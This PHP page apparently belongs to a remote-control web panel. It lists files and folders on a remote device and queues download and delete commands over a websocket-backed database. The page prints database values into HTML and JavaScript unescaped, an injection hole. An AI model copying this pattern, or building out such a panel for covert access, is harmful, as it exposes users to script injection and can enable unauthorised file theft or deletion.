<?php
session_start();
$statusCode=false;
if(!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
	include '../../config.php';
	include_once '../database/webSocket.php';

	$database = new database;
	$path = $database->ws_GetPath();
	if($path=="") $path = "/";

	$FileFolder = $database->ws_GetFileFolder();
	$file =  explode('!!!!', $FileFolder)[2];
	$folder = explode('!!!!', $FileFolder)[1];

	$arrayFile = explode('|', $file);
	$arrayFolder= explode('|', $folder);

	$command = $database->ws_GetCommand();
	$command = str_replace('opendir:','',$command);
	$command = str_replace('!!!!','',$command);
		
	echo "
			<center>File System</center></br>
			 <div  style='background:#1D1F24; text-align: left; margin-left:10px '>
				<input type='hidden' id='savepath' value='$path'/>
				<a style='background:#1D1F24; ' >Path: $path</a></br>
				<a style='background:#1D1F24; ' >Command: $command</a></br>
			</div>
			
			<center>
			<div style='width:98%; height: 1px; background:#333' ></div></br>
			</center>
			";
			
				echo "<div  style='background:#1D1F24; text-align: left; margin-left:10px; margin-botton:10px; overflow: auto; max-height: 300px;'>";
					
					if(($file=="")&&($folder=="")){
						if($path!=="/"){
							echo "<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>..</a></br>";
						}
						echo "</br></br></br></br></br>";
					}else{
						if($path=="/"){}else{
							echo "<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>..</a></br>";
						}
					}
					
					foreach($arrayFolder as $fold){
						if($fold !== "")echo "<span class='glyphicon glyphicon-folder-open' aria-hidden='true' style='color:#337ab7'></span>
						<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>$fold</a>
						<a href='javascript:void(addcommand(\"deletefilefolder:$path/$fold!!!!\"))' class='glyphicon glyphicon-remove' aria-hidden='true' style='color:#337ab7' ></a></br>";
					}
					foreach($arrayFile as $fil){
						if($fil !== "")echo "<span class='glyphicon glyphicon-file' aria-hidden='true' style='color:#337ab7'></span>
						<a style='background:#1D1F24;'>$fil</a>
						<a href='javascript:void(addcommand(\"downloadfile:$path/$fil!!!!\"))' class='glyphicon glyphicon-cloud-download' aria-hidden='true' style='color:#337ab7' ></a>
						<a href='javascript:void(addcommand(\"deletefilefolder:$path/$fil!!!!\"))' class='glyphicon glyphicon-remove' aria-hidden='true' style='color:#337ab7' ></a></br>";
					}
				echo "</div>
				<center>
			<div style='width:98%; height: 1px; background:#333;  margin-top: 20px' ></div></br>
			</center>
		";
	$database = new database;
	$database->ws_UpdateStatusFileFolder('0');
}